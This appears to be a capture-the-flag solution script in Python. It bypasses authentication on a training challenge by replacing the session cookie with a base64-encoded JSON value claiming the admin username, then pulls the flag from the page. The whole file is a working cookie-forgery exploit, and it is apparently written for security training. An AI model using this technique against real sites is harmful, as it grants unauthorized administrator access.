import random, string, re, base64, requests
from requests import sessions

s = requests.session()

def randomword(length):
   letters = string.ascii_lowercase
   return ''.join(random.choice(letters) for i in range(length))

username = randomword(8)
content = randomword(8)

BASE_URL = 'http://quicknote.challs.olicyber.it/'
CREATE_URL = f'{BASE_URL}create?username={username}&content={content}'
PAYLOAD = '{"username": "admin"}'

s.get(CREATE_URL)
s.get(BASE_URL)
s.cookies.clear()
s.cookies['user'] = base64.b64encode(PAYLOAD.encode()).decode()
r = s.get(BASE_URL)
flag = re.search(r'flag{.*}', r.text).group(0)
print(flag)
